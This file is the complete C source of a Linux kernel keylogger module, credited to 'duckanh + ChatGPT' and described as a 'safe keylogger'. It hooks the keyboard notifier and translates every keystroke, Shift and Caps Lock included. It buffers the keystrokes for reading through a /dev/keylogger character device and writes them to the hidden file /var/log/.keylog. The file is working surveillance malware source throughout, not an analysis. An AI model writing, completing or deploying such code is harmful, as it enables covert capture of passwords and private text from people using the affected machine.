#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/uaccess.h>
#include <linux/spinlock.h>
#include <linux/workqueue.h>
#include <linux/wait.h>
#include <linux/fcntl.h>
#include <linux/cred.h>
#include <linux/slab.h>
#include <linux/file.h>
#include <linux/keyboard.h>
#include <linux/input.h>

#define DEVICE_NAME "keylogger"
#define BUF_SIZE 1024
#define LOG_PATH "/var/log/.keylog"
#define MAX_PENDING_CHARS 6 // Đủ dài cho chuỗi như [BACKSPACE]

static dev_t dev_num;
static struct cdev keylogger_cdev;
static struct class *keylogger_class;

static char keybuf[BUF_SIZE];
static int head = 0, tail = 0;
static DEFINE_SPINLOCK(buf_lock);
static DECLARE_WAIT_QUEUE_HEAD(keylogger_wq);

static struct work_struct keylogger_work;
static char pending_key[MAX_PENDING_CHARS]; // Mảng để lưu chuỗi đặc biệt
static int pending_count = 0;
static struct file *log_file;

static bool shift_pressed = false;
static bool caps_lock_active = false;

struct key_map {
    int keycode;
    const char *special; // Chuỗi đặc biệt cho phím không có ký tự ASCII
    char normal;
    char shifted;
};

static const struct key_map keymap[] = {
    {KEY_1, NULL, '1', '!'}, {KEY_2, NULL, '2', '@'}, {KEY_3, NULL, '3', '#'}, {KEY_4, NULL, '4', '$'},
    {KEY_5, NULL, '5', '%'}, {KEY_6, NULL, '6', '^'}, {KEY_7, NULL, '7', '&'}, {KEY_8, NULL, '8', '*'},
    {KEY_9, NULL, '9', '('}, {KEY_0, NULL, '0', ')'}, {KEY_MINUS, NULL, '-', '_'}, {KEY_EQUAL, NULL, '=', '+'},
    {KEY_TAB, NULL, '\t', '\t'}, {KEY_Q, NULL, 'q', 'Q'}, {KEY_W, NULL, 'w', 'W'}, {KEY_E, NULL, 'e', 'E'},
    {KEY_R, NULL, 'r', 'R'}, {KEY_T, NULL, 't', 'T'}, {KEY_Y, NULL, 'y', 'Y'}, {KEY_U, NULL, 'u', 'U'},
    {KEY_I, NULL, 'i', 'I'}, {KEY_O, NULL, 'o', 'O'}, {KEY_P, NULL, 'p', 'P'}, {KEY_LEFTBRACE, NULL, '[', '{'},
    {KEY_RIGHTBRACE, NULL, ']', '}'}, {KEY_ENTER, NULL, '\n', '\n'}, {KEY_A, NULL, 'a', 'A'}, {KEY_S, NULL, 's', 'S'},
    {KEY_D, NULL, 'd', 'D'}, {KEY_F, NULL, 'f', 'F'}, {KEY_G, NULL, 'g', 'G'}, {KEY_H, NULL, 'h', 'H'},
    {KEY_J, NULL, 'j', 'J'}, {KEY_K, NULL, 'k', 'K'}, {KEY_L, NULL, 'l', 'L'}, {KEY_SEMICOLON, NULL, ';', ':'},
    {KEY_APOSTROPHE, NULL, '\'', '"'}, {KEY_BACKSLASH, NULL, '\\', '|'}, {KEY_Z, NULL, 'z', 'Z'},
    {KEY_X, NULL, 'x', 'X'}, {KEY_C, NULL, 'c', 'C'}, {KEY_V, NULL, 'v', 'V'}, {KEY_B, NULL, 'b', 'B'},
    {KEY_N, NULL, 'n', 'N'}, {KEY_M, NULL, 'm', 'M'}, {KEY_COMMA, NULL, ',', '<'}, {KEY_DOT, NULL, '.', '>'},
    {KEY_SLASH, NULL, '/', '?'}, {KEY_SPACE, NULL, ' ', ' '},
    // Phím điều khiển
    {KEY_BACKSPACE, "[BS]", 0, 0}, // Backspace
    {KEY_DELETE, "[DEL]", 0, 0},       // Delete
    {KEY_LEFTCTRL, "[CT]", 0, 0},       // Left Ctrl
    {KEY_RIGHTCTRL, "[CT]", 0, 0},      // Right Ctrl
    {KEY_UP, "[UP]", 0, 0},               // Up
    {KEY_DOWN, "[D]", 0, 0},           // Down
    {KEY_LEFT, "[L]", 0, 0},           // Left
    {KEY_RIGHT, "[R]", 0, 0},         // Right
    {0, NULL, 0, 0} // Kết thúc bảng
};

static void set_pending_key(int keycode) {
    for (int i = 0; keymap[i].keycode; i++) {
        if (keymap[i].keycode == keycode) {
            if (keymap[i].special) {
                // Ghi chuỗi đặc biệt
                const char *special = keymap[i].special;
                pending_count = 0;
                while (*special && pending_count < MAX_PENDING_CHARS - 1) {
                    pending_key[pending_count++] = *special++;
                }
                pending_key[pending_count] = '\0';
            } else {
                bool is_letter = (keycode >= KEY_A && keycode <= KEY_Z);
                bool use_shifted = shift_pressed ^ (is_letter && caps_lock_active);
                char c = use_shifted ? keymap[i].shifted : keymap[i].normal;
                if (c) {
                    pending_key[0] = c;
                    pending_count = 1;
                }
            }
            break;
        }
    }
}

static void keylogger_work_func(struct work_struct *work) {
    unsigned long flags;

    if (pending_count == 0) return;

    spin_lock_irqsave(&buf_lock, flags);
    for (int i = 0; i < pending_count; i++) {
        keybuf[head] = pending_key[i];
        head = (head + 1) % BUF_SIZE;
        if (head == tail)
            tail = (tail + 1) % BUF_SIZE;
    }
    spin_unlock_irqrestore(&buf_lock, flags);

    wake_up_interruptible(&keylogger_wq);

    if (log_file) {
        loff_t pos = 0;
        for (int i = 0; i < pending_count; i++) {
            printk(KERN_DEBUG "Writing to log: %c\n", pending_key[i]); // Debug log
            ssize_t written = kernel_write(log_file, &pending_key[i], 1, &pos);
            if (written < 0) {
                printk(KERN_ERR "Failed to write to log file: %ld\n", written);
            }
        }
        vfs_fsync(log_file, 0); // Flush file
    }
    pending_count = 0; // Reset queue
}

static int keylogger_notifier(struct notifier_block *nb, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = data;

    printk(KERN_DEBUG "Notifier action: %lu, value: %d, down: %d\n", action, param->value, param->down); // Debug log

    if (action == KBD_KEYCODE) {
        if (param->value == KEY_LEFTSHIFT || param->value == KEY_RIGHTSHIFT) {
            shift_pressed = param->down;
            return NOTIFY_OK;
        }
        if (param->value == KEY_CAPSLOCK && param->down) {
            caps_lock_active = !caps_lock_active;
            return NOTIFY_OK;
        }
        if (param->down) {
            set_pending_key(param->value);
            if (pending_count > 0) {
                schedule_work(&keylogger_work);
            }
        }
    }

    return NOTIFY_OK;
}

static struct notifier_block nb = {
    .notifier_call = keylogger_notifier
};

static ssize_t keylogger_read(struct file *file, char __user *buf, size_t len, loff_t *off) {
    int copied = 0;
    unsigned long flags;

    if (wait_event_interruptible(keylogger_wq, tail != head))
        return -ERESTARTSYS;

    spin_lock_irqsave(&buf_lock, flags);
    while (tail != head && copied < len) {
        if (put_user(keybuf[tail], buf + copied)) {
            spin_unlock_irqrestore(&buf_lock, flags);
            return -EFAULT;
        }
        tail = (tail + 1) % BUF_SIZE;
        copied++;
    }
    spin_unlock_irqrestore(&buf_lock, flags);

    return copied;
}

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = keylogger_read,
};

static int __init keylogger_init(void) {
    int ret;

    log_file = filp_open(LOG_PATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (IS_ERR(log_file)) {
        printk(KERN_ERR "Failed to open log file: %ld\n", PTR_ERR(log_file));
        log_file = NULL;
    } else if (log_file == NULL) {
        printk(KERN_ERR "Log file pointer is NULL\n");
    } else {
        printk(KERN_INFO "Log file opened successfully\n");
    }

    INIT_WORK(&keylogger_work, keylogger_work_func);
    spin_lock_init(&buf_lock);

    ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);
    if (ret < 0) {
        printk(KERN_ERR "Failed to allocate character device region: %d\n", ret);
        return ret;
    }

    cdev_init(&keylogger_cdev, &fops);
    ret = cdev_add(&keylogger_cdev, dev_num, 1);
    if (ret < 0) {
        printk(KERN_ERR "Failed to add character device: %d\n", ret);
        goto unregister;
    }

    keylogger_class = class_create(DEVICE_NAME);
    if (IS_ERR(keylogger_class)) {
        ret = PTR_ERR(keylogger_class);
        printk(KERN_ERR "Failed to create device class: %d\n", ret);
        goto del_cdev;
    }

    device_create(keylogger_class, NULL, dev_num, NULL, DEVICE_NAME);

    ret = register_keyboard_notifier(&nb);
    if (ret < 0) {
        printk(KERN_ERR "Failed to register keyboard notifier: %d\n", ret);
        goto destroy_device;
    }

    printk(KERN_INFO "Keylogger loaded (keyboard_notifier).\n");
    return 0;

destroy_device:
    device_destroy(keylogger_class, dev_num);
    class_destroy(keylogger_class);
del_cdev:
    cdev_del(&keylogger_cdev);
unregister:
    unregister_chrdev_region(dev_num, 1);
    return ret;
}

static void __exit keylogger_exit(void) {
    unregister_keyboard_notifier(&nb);
    flush_work(&keylogger_work);
    device_destroy(keylogger_class, dev_num);
    class_destroy(keylogger_class);
    cdev_del(&keylogger_cdev);
    unregister_chrdev_region(dev_num, 1);
    if (log_file) {
        filp_close(log_file, NULL);
        printk(KERN_INFO "Log file closed.\n");
    }
    printk(KERN_INFO "Keylogger unloaded.\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("duckanh + ChatGPT");
MODULE_DESCRIPTION("Safe keylogger using keyboard_notifier + char device + log file");
